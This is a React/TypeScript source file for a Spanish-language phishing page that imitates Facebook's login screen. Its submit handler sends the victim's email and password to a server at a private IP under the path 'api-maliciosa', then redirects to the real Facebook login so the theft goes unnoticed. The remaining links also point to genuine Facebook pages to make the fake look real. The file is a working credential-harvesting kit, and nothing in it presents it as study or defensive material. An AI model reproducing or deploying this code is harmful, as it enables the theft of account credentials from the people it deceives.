import { SubmitHandler, useForm } from "react-hook-form";

export default function Login() {
  const {
    register,
    handleSubmit,
    formState: { isSubmitting },
  } = useForm<FormValues>({
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const handleFormSubmit: SubmitHandler<FormValues> = async (data) => {
    await fetch("http://192.168.208.136/api-maliciosa/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    window.location.href = "https://www.facebook.com/login";
  };

  return (
    <div className="app">
      <div className="facebook-login-container">
        <div className="facebook-logo">
          <h1>facebook</h1>
          <p>
            Facebook te ayuda a comunicarte y compartir con las personas que
            forman parte de tu vida.
          </p>
        </div>

        <div className="login-form">
          <form onSubmit={handleSubmit(handleFormSubmit)}>
            <input
              {...register("email")}
              type="text"
              placeholder="Correo electrónico o número de teléfono"
              className="input-field"
              required
            />
            <input
              {...register("password")}
              type="password"
              placeholder="Contraseña"
              className="input-field"
              required
            />
            <button
              className="login-button"
              type="submit"
              disabled={isSubmitting}
            >
              Iniciar sesión
            </button>
          </form>
          <a
            href="#"
            className="forgot-password"
            onClick={() =>
              (window.location.href =
                "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0")
            }
          >
            ¿Olvidaste tu contraseña?
          </a>
          <div className="divider"></div>
          <button
            className="create-new-account-button"
            onClick={() =>
              (window.location.href = "https://www.facebook.com/reg/")
            }
          >
            Crear cuenta nueva
          </button>
        </div>
      </div>

      <footer className="footer">
        <ul>
          <li>Español</li>
          <li>English (US)</li>
          <li>Português (Brasil)</li>
          <li>Français (France)</li>
          <li>Deutsch</li>
          <li>...</li>
        </ul>
        <div className="footer-links">
          <a href="#">Registrarte</a>
          <a href="#">Iniciar sesión</a>
          <a href="#">Messenger</a>
          <a href="#">Facebook Lite</a>
          <a href="#">Watch</a>
          <a href="#">Lugares</a>
          <a href="#">Juegos</a>
          <a href="#">Marketplace</a>
          <a href="#">Meta Pay</a>
          <a href="#">Grupos</a>
          <a href="#">Empleo</a>
          <a href="#">Desarrolladores</a>
          <a href="#">Condiciones</a>
          <a href="#">Ayuda</a>
        </div>
        <div className="footer-meta">Meta © 2024</div>
      </footer>
    </div>
  );
}

type FormValues = {
  email: string;
  password: string;
};
